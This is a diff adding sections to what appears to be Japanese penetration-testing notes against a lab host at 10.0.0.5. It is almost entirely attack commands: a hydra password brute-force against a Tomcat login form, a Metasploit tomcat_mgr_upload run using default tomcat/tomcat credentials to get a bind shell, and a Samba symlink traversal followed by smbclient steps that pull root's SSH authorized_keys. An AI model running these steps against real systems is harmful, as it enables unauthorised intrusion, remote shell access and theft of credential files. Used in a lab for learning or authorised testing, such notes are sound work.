@@ -258,3 +258,45 @@ john --incremental password.txt
 ```bash
 hydra -L userlist.txt -P password.txt -s 8180 10.0.0.5 http-post-form "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
 ```
+
+### tomcat攻撃
+
+```bash
+msfconsole
+grep exploit search tomcat
+use exploit/multi/http/tomcat_mgr_upload
+show targets
+set target 2
+set payload linux/x86/shell_bind_tcp
+set HttpUsername tomcat
+set HttpPassword tomcat
+set RHOST 10.0.0.5
+set RPORT 8180
+show options
+# tomcat55権限でshell操作可能になる
+exploit
+```
+
+### ディレクトリトラバーサル
+
+```bash
+# ログインを試してみる
+smbclient -L //10.0.0.5
+
+# ディレクトリトラバーサルを試す
+use auxiliary/admin/smb/samba_symlink_traversal
+set RHOSTS 10.0.0.5
+set SMBSHARE tmp
+exploit
+exit
+
+# アクセス可能になった（root権限はない）
+smbclient //10.0.0.5/tmp
+
+# sshキー取得
+cd \rootfs\root\.ssh\
+# ダウンロードする
+get authorized_keys
+
+# ファイラーで "smb://10.0.0.5/tmp" で同様にアクセス可
+```
